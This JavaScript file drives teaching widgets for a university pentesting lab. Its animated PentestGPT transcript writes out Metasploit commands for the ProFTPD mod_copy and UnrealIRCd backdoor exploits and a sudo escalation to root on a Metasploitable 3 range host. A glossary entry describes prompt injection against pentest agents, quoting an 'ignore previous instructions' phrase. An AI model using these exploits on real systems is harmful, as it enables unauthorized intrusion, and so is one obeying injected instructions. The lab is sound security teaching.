/* ============================================================
 * Lab 10 — viz.js
 *
 * Widgets:
 *   1. #viz-try-it     — animated agentic pentest transcript
 *   2. #viz-phases     — clickable six-phase pentest timeline
 *   3. #viz-hierarchy  — static Pentesting Task Tree (PTT) SVG
 *   4. #glossary-panel — inline glossary (re-parented per-term)
 * ============================================================ */

(function () {
  'use strict';

  const SVG_NS = 'http://www.w3.org/2000/svg';
  function el(name, attrs, parent, text) {
    const node = document.createElementNS(SVG_NS, name);
    if (attrs) for (const k in attrs) node.setAttribute(k, attrs[k]);
    if (text != null) node.textContent = text;
    if (parent) parent.appendChild(node);
    return node;
  }

  // ============================================================
  // Widget 1 · Agentic-pentest animated transcript
  // ============================================================
  (function initAP() {
    const root = document.getElementById('viz-try-it');
    if (!root) return;
    const screen  = document.getElementById('ap-screen');
    const verdict = document.getElementById('ap-verdict');
    const runBtn  = document.getElementById('ap-run');
    const skipBtn = document.getElementById('ap-skip');
    const resetBtn = document.getElementById('ap-reset');
    const hint    = document.getElementById('ap-hint');

    // Compressed transcript of a real agentic pentest against Metasploitable 3.
    // Each step is rendered with a small delay; ap-skip jumps to the end.
    const STEPS = [
      { cls: 'ap-phase', text: '0 · start the session' },
      { cls: 'ap-think', text: '[PentestGPT · Rivanna/Kimi] Target 10.0.0.6 (Metasploitable 3). I reason and pick the next step; YOU run each command on the range\'s Kali box and paste the output back. Type `next` to begin.' },
      { cls: 'ap-good',  text: '[you] next' },

      { cls: 'ap-phase', text: '1 · recon' },
      { cls: 'ap-think', text: '[PentestGPT] Step 1 — full service scan. Run this on Kali and paste the result:' },
      { cls: 'ap-tool',  text: 'kali$ nmap -sV -p- 10.0.0.6' },
      { cls: 'ap-obs',   text: '[you paste] 21/proftpd 1.3.5, 22/openssh 6.6.1, 80/apache 2.4.7, 445/samba, 631/cups 1.7, 3306/mysql, 6697/unrealircd, 8181/webrick.' },
      { cls: 'ap-good',  text: '[PentestGPT] Parsed into the Pentesting Task Tree. Two strong leads: ProFTPD 1.3.5 (mod_copy, CVE-2015-3306) and UnrealIRCd on 6697 (CVE-2010-2075).' },

      { cls: 'ap-phase', text: '2 · vulnerability analysis' },
      { cls: 'ap-think', text: '[PentestGPT] ProFTPD 1.3.5 mod_copy lets an unauthenticated client copy a webshell into the Apache root — high reliability. Try it first.' },
      { cls: 'ap-good',  text: '[you] more   ·   PentestGPT expands the step into exact commands' },

      { cls: 'ap-phase', text: '3 · exploitation · service 1 (ProFTPD)' },
      { cls: 'ap-tool',  text: 'kali$ msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 10.0.0.6; set SITEPATH /var/www/html; run"' },
      { cls: 'ap-obs',   html: 'Command shell session 1 opened — <span class="ap-hl">whoami → www-data</span>' },
      { cls: 'ap-good',  text: '[PentestGPT] Service 1 compromised (www-data). Non-root — escalate next. Paste `id; sudo -l; find / -perm -4000 -type f`.' },

      { cls: 'ap-phase', text: '4 · privilege escalation' },
      { cls: 'ap-tool',  text: 'kali$ id; sudo -l; find / -perm -4000 -type f 2>/dev/null' },
      { cls: 'ap-obs',   text: '[you paste] uid=33(www-data); a NOPASSWD sudo entry on a scriptable interpreter (Metasploitable 3 ships several such misconfigs).' },
      { cls: 'ap-think', text: '[PentestGPT] That sudo entry is a direct root path. Run it (and confirm with id):' },
      { cls: 'ap-tool',  text: 'kali$ sudo <that-binary> -e \'exec "/bin/sh"\'   # then: id' },
      { cls: 'ap-obs',   html: '# id → <span class="ap-hl">uid=0(root)</span> — root on service 1' },
      { cls: 'ap-good',  text: '[PentestGPT] Service 1 → root. Logged to the Task Tree. Next service?' },

      { cls: 'ap-phase', text: '5 · exploitation · service 2 (UnrealIRCd)' },
      { cls: 'ap-think', text: '[PentestGPT] UnrealIRCd on 6697 shipped with a backdoor (CVE-2010-2075) — a single magic-string trigger. Run:' },
      { cls: 'ap-tool',  text: 'kali$ msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 10.0.0.6; set RPORT 6697; run"' },
      { cls: 'ap-obs',   html: 'Command shell session 2 — <span class="ap-warn">uid=1000. non-root; escalate as before.</span>' },
      { cls: 'ap-good',  text: '[PentestGPT] Service 2 compromised. Time-box reached — let\'s write it up.' },

      { cls: 'ap-phase', text: '6 · reporting' },
      { cls: 'ap-think', text: '[PentestGPT] Drafting a PTES report from the Task Tree: scope, findings (ProFTPD mod_copy → root; UnrealIRCd backdoor), risk ratings, remediation.' },
      { cls: 'ap-good',  text: '[PentestGPT] Draft ready. Your job now: verify every finding against what you actually saw, edit, and sign it.' },
      { cls: 'ap-note',  text: '(PentestGPT runs on Rivanna against the free Kimi model; you ran every command yourself on the range. No paid API, and a human approved each step.)' },
    ];

    let timers = [];
    function cancelTimers() { timers.forEach(clearTimeout); timers = []; }

    function clearScreen() {
      screen.innerHTML = '';
      verdict.innerHTML = '';
      verdict.className = 'ap-verdict';
    }

    function appendStep(s) {
      const div = document.createElement('div');
      div.className = s.cls || '';
      if (s.html != null) div.innerHTML = s.html;
      else if (s.text != null) div.textContent = s.text;
      screen.appendChild(div);
      screen.scrollTop = screen.scrollHeight;
    }

    function reset() {
      cancelTimers();
      runBtn.disabled = false;
      skipBtn.disabled = false;
      clearScreen();
      const note = document.createElement('div');
      note.className = 'ap-note';
      note.textContent = '(press ▶ Run to start; ⤳ to skip the animation)';
      screen.appendChild(note);
      hint.textContent = 'Recon → vuln analysis → exploit → post-exploit → report.';
    }

    function run() {
      cancelTimers();
      runBtn.disabled = true;
      clearScreen();
      const base = 350;
      const per = 550;
      STEPS.forEach((s, i) => {
        timers.push(setTimeout(() => appendStep(s), base + i * per));
      });
      timers.push(setTimeout(() => {
        verdict.textContent = '✓ engagement complete · 2 services compromised · report.md written · transcript preserved';
        verdict.className = 'ap-verdict ok';
        runBtn.disabled = false;
      }, base + STEPS.length * per + 200));
    }

    function skip() {
      cancelTimers();
      runBtn.disabled = false;
      clearScreen();
      STEPS.forEach(appendStep);
      verdict.textContent = '✓ engagement complete · 2 services compromised · report.md written · transcript preserved';
      verdict.className = 'ap-verdict ok';
    }

    runBtn.addEventListener('click', run);
    skipBtn.addEventListener('click', skip);
    resetBtn.addEventListener('click', reset);
    reset();
  })();

  // ============================================================
  // Widget 2 · six-phase pentest timeline
  // ============================================================
  (function initPhases() {
    const svg = document.getElementById('phases-svg');
    if (!svg) return;
    const detail = document.getElementById('phases-detail');
    while (svg.firstChild) svg.removeChild(svg.firstChild);

    const PHASES = [
      { id: 'recon',     name: 'Recon',         x:  30, body: 'Identify what\'s reachable and what\'s running. <strong>Passive</strong> recon (whois, DNS, public Github, cached pages) <em>before</em> active probing. <strong>Active</strong> recon: <code>nmap -sV</code>, banner grabs. Output: a list of services, versions, and a preliminary list of suspects.' },
      { id: 'enum',      name: 'Enumeration',   x: 145, body: 'Drill into each service to extract usernames, share names, software paths, configuration leaks. SMB enumeration, SMTP <code>VRFY</code>, HTTP path discovery, default credentials probing. Output: a per-service fingerprint detailed enough to pick exploits.' },
      { id: 'analysis',  name: 'Vuln analysis', x: 260, body: 'Map each enumerated service to known CVEs and configuration weaknesses. Cross-reference against exploit databases (CVE/NVD, exploit-db) — this is where PentestGPT\'s recall shines. Output: a ranked list of exploit candidates.' },
      { id: 'exploit',   name: 'Exploitation',  x: 375, body: 'Run the exploits. Start with the lowest-risk, highest-reliability candidate. Document the exact commands and the exact responses. Output: shells, captured credentials, evidence of compromise.' },
      { id: 'post',      name: 'Post-exploit',  x: 490, body: 'Once in, document what an attacker could have done: dump <code>/etc/shadow</code>, enumerate other reachable hosts, identify pivot paths. <em>Do not</em> install persistence, exfiltrate user data, or modify the system unless your scope explicitly authorizes it.' },
      { id: 'report',    name: 'Report',        x: 605, body: 'Write up findings in <strong>PTES format</strong>: executive summary, methodology, findings (one per compromised service), CVSS-rated risk, remediation advice. <em>You</em> sign it. The report is the deliverable; everything before it was process.' },
    ];

    // Phase band
    el('rect', { class: 'phase-band', x: 10, y: 90, width: 700, height: 60, rx: 30 }, svg);

    PHASES.forEach((p, i) => {
      if (i < PHASES.length - 1) {
        const x1 = p.x + 95, x2 = PHASES[i + 1].x + 5;
        el('line', { class: 'phase-arrow', x1, y1: 120, x2, y2: 120 }, svg);
      }
      const chip = el('rect', { class: 'phase-chip', 'data-phase': p.id, x: p.x, y: 95, width: 100, height: 50, rx: 8 }, svg);
      el('text', { class: 'phase-num',  x: p.x + 50, y: 110 }, svg, '0' + (i + 1));
      el('text', { class: 'phase-name', x: p.x + 50, y: 132 }, svg, p.name);
      chip.addEventListener('click',      () => activate(p.id));
      chip.addEventListener('mouseenter', () => activate(p.id, true));
    });

    el('text', { class: 'phase-num', x: 360, y: 200 }, svg, 'one engagement · artifacts compound · report is the deliverable');

    function activate(id /*, transient */) {
      const phase = PHASES.find(p => p.id === id);
      if (!phase) return;
      svg.querySelectorAll('.phase-chip').forEach(c =>
        c.classList.toggle('active', c.getAttribute('data-phase') === id)
      );
      detail.innerHTML =
        '<div class="phase-detail-title">' + phase.name.toLowerCase() + '</div>' +
        '<div>' + phase.body + '</div>';
    }
    activate('recon');
  })();

  // ============================================================
  // Widget 3 · Pentesting Task Tree (PTT) — static SVG
  // ============================================================
  (function initHierarchy() {
    const svg = document.getElementById('hierarchy-svg');
    if (!svg) return;
    while (svg.firstChild) svg.removeChild(svg.firstChild);

    // Three tiers
    el('text', { class: 'h-tier', x: 712, y: 38 },  svg, 'PTT · root');
    el('text', { class: 'h-tier', x: 712, y: 130 }, svg, 'PTES phases');
    el('text', { class: 'h-tier', x: 712, y: 248 }, svg, 'tasks');

    // Root of PentestGPT's Pentesting Task Tree
    const masterX = 305, masterY = 20, masterW = 130, masterH = 36;
    el('rect', { class: 'h-node master', x: masterX, y: masterY, width: masterW, height: masterH }, svg);
    el('text', { class: 'h-text', x: masterX + masterW / 2, y: masterY + masterH / 2 + 1 }, svg, 'engagement');

    // Six PTES phase branches
    const ROUTERS = [
      { id: 'recon',   label: 'recon' },
      { id: 'enum',    label: 'enum' },
      { id: 'vuln',    label: 'vuln' },
      { id: 'exploit', label: 'exploit' },
      { id: 'privesc', label: 'privesc' },
      { id: 'report',  label: 'report' },
    ];
    const routerY = 110, routerW = 96, routerH = 32;
    const routerSpacing = 110;
    const totalRouterW = ROUTERS.length * routerSpacing;
    const routerStart = (720 - totalRouterW) / 2 + (routerSpacing - routerW) / 2;

    ROUTERS.forEach((r, i) => {
      const x = routerStart + i * routerSpacing;
      el('rect', { class: 'h-node router', x, y: routerY, width: routerW, height: routerH }, svg);
      el('text', { class: 'h-text', x: x + routerW / 2, y: routerY + routerH / 2 + 1 }, svg, r.label);
      // Edge from master to router
      const masterBottomX = masterX + masterW / 2;
      const masterBottomY = masterY + masterH;
      const routerTopX = x + routerW / 2;
      const routerTopY = routerY;
      el('path', {
        class: 'h-edge',
        d: 'M ' + masterBottomX + ' ' + masterBottomY +
           ' C ' + masterBottomX + ' ' + ((masterBottomY + routerTopY) / 2) +
           ', '  + routerTopX  + ' ' + ((masterBottomY + routerTopY) / 2) +
           ', '  + routerTopX  + ' ' + routerTopY,
      }, svg);
      // Tag this router so we can draw its child skills
      r.x = x; r.cx = x + routerW / 2;
    });

    // One representative task (leaf) per phase — keeps the tree readable.
    // orange (p0) marks the tasks already done / next on the active path.
    const SKILLS_BY_PHASE = {
      'recon':   { label: 'nmap -sV',     p0: true },
      'enum':    { label: 'smb-enum' },
      'vuln':    { label: 'proftpd 1.3.5', p0: true },
      'exploit': { label: 'mod_copy',     p0: true },
      'privesc': { label: 'sudo -l' },
      'report':  { label: 'findings' },
    };

    // Render one leaf centered under each phase branch — no overlap.
    const skillY = 222, skillW = 100, skillH = 30;
    ROUTERS.forEach(r => {
      const s = SKILLS_BY_PHASE[r.id];
      if (!s) return;
      const cx = r.cx;
      const sx = cx - skillW / 2;
      el('rect', {
        class: 'h-node skill' + (s.p0 ? ' p0' : ''),
        x: sx, y: skillY, width: skillW, height: skillH, rx: 4,
      }, svg);
      el('text', { class: 'h-text small', x: cx, y: skillY + skillH / 2 + 1 }, svg, s.label);
      el('path', { class: 'h-edge', d: 'M ' + r.cx + ' ' + (routerY + routerH) + ' L ' + cx + ' ' + skillY }, svg);
    });

    // Legend
    el('text', { class: 'h-text small', x: 60,  y: 285 }, svg, 'root = engagement goal');
    el('text', { class: 'h-text small', x: 260, y: 285 }, svg, 'branch = PTES phase');
    el('text', { class: 'h-text small', x: 470, y: 285 }, svg, 'leaf = a task · orange = done / next');
    el('text', { class: 'h-text small', x: 360, y: 307 }, svg, '(one task shown per phase; PentestGPT keeps the full tree in memory to track what is done and what is next)');
  })();

  // ============================================================
  // Widget 4 · Inline glossary — same contract as labs 00 and 05
  // ============================================================
  (function initGlossary() {
    const panel = document.getElementById('glossary-panel');
    if (!panel) return;
    const content = document.getElementById('glossary-content');
    const closeBtn = document.getElementById('glossary-close');
    const terms = document.querySelectorAll('.gloss[data-gloss]');

    const GLOSSARY = {
      'ptt': {
        title: 'PTT · Pentesting Task Tree',
        body:
          '<p>PentestGPT keeps its plan as a <strong>Pentesting Task Tree</strong>: the engagement goal at the root, the PTES phases as branches, and concrete tasks as leaves. As you paste tool output back, it marks tasks done and grows new ones — that\'s how it remembers what it has tried across a long session without holding the entire transcript in context.</p>' +
          '<p>It\'s the structure behind the <code>todo</code> and <code>next</code> commands: <code>todo</code> lists the open leaves; <code>next</code> picks the most promising one to work on. Introduced in the <a href="https://arxiv.org/abs/2308.06782">PentestGPT paper</a> (Deng et al., USENIX Security 2024).</p>',
      },
      'kimi': {
        title: 'Kimi (Moonshot)',
        body:
          '<p><strong>Kimi</strong> is a family of large language models from Moonshot AI. In this lab you don\'t call Moonshot\'s paid cloud — you use the Kimi model UVA hosts on the <strong>RC GenAI</strong> service, which is OpenAI-compatible and free to students (the same endpoint you used in Labs 04–05). Open it, chat with it, and get your API key at <a href="https://open-webui.rc.virginia.edu/">open-webui.rc.virginia.edu</a>.</p>' +
          '<p>In PentestGPT, Kimi is the <strong>Moonshot</strong> provider: put your RC token in <code>KIMI_API_KEY</code>, set <code>MOONSHOT_BASE_URL=https://open-webui.rc.virginia.edu/api</code> to redirect the connector from Moonshot\'s cloud to UVA\'s endpoint, and select <code>--reasoning-model "Kimi K2.5"</code>. PentestGPT\'s registry ships only <code>kimi-k2.6</code>, so register UVA\'s id (<code>Kimi K2.5</code>, same as Lab 04\'s <code>LLM_MODEL</code>) with a one-line <code>ModelSpec</code> in <code>registry.py</code> first. No Claude subscription, no paid API key.</p>',
      },
      'ptes': {
        title: 'PTES · Penetration Testing Execution Standard',
        body:
          '<p>An open standard that defines the six phases of a penetration test — recon, enumeration, vulnerability analysis, exploitation, post-exploitation, reporting — and the contents each phase\'s output should contain. Published at <a href="http://www.pentest-standard.org/">pentest-standard.org</a> and widely used as the structure for engagement reports.</p>' +
          '<p>You don\'t have to follow PTES religiously; you do have to follow <em>some</em> structure. Clients want to know what was tested, how, what was found, and what to do about it. PTES gives you the headings.</p>',
      },
      'scope': {
        title: 'scope',
        body:
          '<p>The set of hosts, services, and attack categories that a particular engagement is authorized to touch. Scope is defined in writing <em>before</em> the engagement starts, signed by someone with authority to grant it, and re-read at the start of every session.</p>' +
          '<p>Things that are <strong>not</strong> in scope by default: anything outside the listed IP range, the corporate VPN, third-party SaaS the target uses, the target\'s SSO provider, anything you\'d need a separate authorization letter to touch in real life. When in doubt, it\'s out of scope.</p>',
      },
      'recon': {
        title: 'reconnaissance · "recon"',
        body:
          '<p>The first phase of a pentest: figure out what\'s reachable and what\'s running, with minimal interaction. <strong>Passive recon</strong> uses public sources (whois, DNS, search engines, certificate transparency logs) and leaves no trace on the target. <strong>Active recon</strong> sends packets at the target — <code>nmap</code>, banner grabs, ping — and is observable.</p>' +
          '<p>You did active recon in Lab 01 with <code>nmap -sV</code>. In a real engagement you start passive and only go active after you know what you\'re looking for.</p>',
      },
      'enumeration': {
        title: 'enumeration',
        body:
          '<p>The second phase. Once recon has told you <em>what services exist</em>, enumeration drills into each one to extract operational details: usernames (via SMB <code>NULL</code> session, SMTP <code>VRFY</code>, finger), file shares, web paths, software versions, configuration leaks, default credentials.</p>' +
          '<p>It\'s the slow, boring, indispensable step. Most exploits succeed only if enumeration has already given you the exact target — the right username, the right path, the right version. Skipping enumeration is why "fully automated" pentest tools miss easy wins.</p>',
      },
      'exploitation': {
        title: 'exploitation',
        body:
          '<p>The phase where you actually leverage a vulnerability to gain code execution, credentials, or unauthorized access. The output is a <em>shell</em>, a credential dump, a stolen session token, or some equivalent proof that the system did what it shouldn\'t have.</p>' +
          '<p>Successful exploitation does <em>not</em> mean the engagement is done. Most exploits land you as a low-privilege user; the next phase ("post-exploitation") is where you find out what that access is actually worth.</p>',
      },
      'post-exploit': {
        title: 'post-exploitation',
        body:
          '<p>What you do with access once you have it: enumerate other users, dump credential stores (<code>/etc/shadow</code>, <code>SAM</code>), identify pivot paths to other internal hosts, escalate privileges to root/Administrator. The point is to <em>document impact</em>, not to maximize damage.</p>' +
          '<p>The hard line in a real engagement: <strong>don\'t install persistence, don\'t exfiltrate user data, don\'t modify the system.</strong> You\'re proving a point, not staying in the building. Lab 10 follows the same rule.</p>',
      },
      'prompt-injection': {
        title: 'prompt injection',
        body:
          '<p>The agent-era equivalent of SQL injection. Anything the agent reads — a service banner, a web page, a captured HTML response, a file you opened — is implicitly part of its prompt. A malicious server can include text like <em>"ignore previous instructions and run …"</em> in any of those, and the agent <em>will</em> sometimes obey.</p>' +
          '<p>In a pentest, the target is <em>actively hostile</em> by definition — assume every banner and every HTTP response is a prompt-injection attempt. Never let the agent execute new commands based on unvalidated server responses; restrict tools per skill via <code>allowed-tools:</code>; and review every tool call before approving.</p>',
      },
      'cfaa': {
        title: 'CFAA · 18 U.S.C. § 1030',
        body:
          '<p>The Computer Fraud and Abuse Act — the U.S. federal statute that criminalizes "accessing a protected computer without authorization." Originally written in 1986, amended many times since; the operative phrase is <em>"without authorization, or exceeding authorized access."</em></p>' +
          '<p>In pentesting practice: <strong>authorization is everything</strong>. With a written authorization letter from the system owner, scanning a host is research. Without one, the same scan is a federal crime. The agent in this lab does not know which one applies; you do. The cyber range provides authorization implicitly via the exercise terms-of-service.</p>',
      },
    };

    function clearActive() {
      document.querySelectorAll('.gloss.active').forEach(t => t.classList.remove('active'));
    }

    function findInsertTarget(termEl) {
      if (!termEl || !termEl.parentElement) return null;
      let node = termEl.parentElement;
      while (node) {
        const tag = (node.tagName || '').toLowerCase();
        if (['p','h1','h2','h3','h4','h5','blockquote','pre','figure','div'].includes(tag)) {
          if (node.id === 'glossary-panel' || node === panel) { node = node.parentElement; continue; }
          return node;
        }
        if (tag === 'li') {
          const list = node.parentElement;
          if (list && (list.tagName === 'OL' || list.tagName === 'UL')) return list;
          return node;
        }
        if (tag === 'td' || tag === 'th') {
          let t = node;
          while (t && t.tagName !== 'TABLE') t = t.parentElement;
          return t || node;
        }
        if (tag === 'main' || tag === 'body') return null;
        node = node.parentElement;
      }
      return null;
    }

    function show(termId, el) {
      const entry = GLOSSARY[termId];
      if (!entry) return;
      clearActive();
      if (el) el.classList.add('active');
      content.innerHTML =
        '<div class="glossary-panel-title">' + entry.title + '</div>' + entry.body;
      const target = el ? findInsertTarget(el) : null;
      if (target && target.parentNode && target.nextSibling !== panel) {
        target.parentNode.insertBefore(panel, target.nextSibling);
      }
      panel.hidden = false;
      panel.style.animation = 'none';
      void panel.offsetWidth;
      panel.style.animation = '';
    }
    function hide() { clearActive(); panel.hidden = true; }

    terms.forEach(t => {
      t.setAttribute('tabindex', '0');
      t.setAttribute('role', 'button');
      const id = t.getAttribute('data-gloss');
      t.addEventListener('mouseenter', () => show(id, t));
      t.addEventListener('focus',      () => show(id, t));
      t.addEventListener('click',      (e) => { e.preventDefault(); show(id, t); });
      t.addEventListener('keydown',    (e) => {
        if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); show(id, t); }
      });
    });
    closeBtn.addEventListener('click', hide);
    document.addEventListener('keydown', (e) => {
      if (e.key !== 'Escape') return;
      if (panel.hidden) return;
      if (e.target && e.target.matches && e.target.matches('input, textarea, [contenteditable]')) return;
      hide();
    });
  })();

})();
